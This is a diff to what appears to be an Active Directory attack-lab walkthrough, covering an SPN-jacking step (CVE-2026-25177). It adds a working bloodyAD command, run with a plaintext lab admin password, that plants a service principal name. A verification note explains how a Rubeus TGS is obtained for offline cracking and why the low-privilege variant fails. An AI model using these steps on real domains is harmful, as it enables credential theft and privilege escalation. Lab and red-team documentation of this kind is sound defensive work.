@@ -3223,10 +3223,15 @@ The `svc_backup` account is created with `acctDisabled=0` (active) and can be us
 #### SPN Jacking — CVE-2026-25177 (WT027)
 
 ```bash
-bloodyAD --host 192.168.77.10 -d cadre.local -u analyst_cloud -p 'Cl0ud_An@lyst!' \
+# VERIFIED 2026-08-01 — self-write command below is NOT viable as-is (see note).
+# Working path: account with writeSPN (chief_command = DA) plants a FREE same-realm SPN
+# on a controlled account -> KDC issues TGS encrypted with that account's key.
+bloodyAD --host 192.168.77.10 -d cadre.local -u chief_command -p 'C0mm@nd_Ch1ef!' \
   set object "CN=analyst_cloud,OU=Cloud,DC=cadre,DC=local" \
-  servicePrincipalName -v "MSSQLSvc/mbr01.child.cadre.local:1433"
+  servicePrincipalName -v "MSSQLSvc/dc01.cadre.local:14333"
 ```
+
+> **Verification note (2026-08-01):** Planted `MSSQLSvc/dc01.cadre.local:14333` on analyst_cloud as chief_command → LDAP read-back OK → `Rubeus asktgt /enctype:aes256` + `asktgs` → **KDC issued TGS encrypted with analyst_cloud's AES key** (attacker-known → offline crack). Cleanup confirmed (SPN removed). **Why the documented low-priv command fails:** (1) `MSSQLSvc/mbr01.child.cadre.local:1433` is already owned by `child\svc_mssql` → forest-wide SPN uniqueness → `A constraint violation occurred`; (2) a free cross-host service SPN via SELF-write → `Access is denied` (the default `Validated write to servicePrincipalName` on SELF only permits own-host SPNs). Cross-realm TGS (`mbr01.child.cadre.local` SPN vs `cadre.local` TGT) additionally needs a referral → `KDC_ERR_WRONG_REALM` in Rubeus asktgs; same-realm SPN avoids it. Also: Server 2025 KDC rejects TGS-REQ built on an RC4 TGT (`KDC_ERR_ETYPE_NOTSUPP`) — use an AES TGT.
 
 #### Persistence — AdminSDHolder (WT025)
 
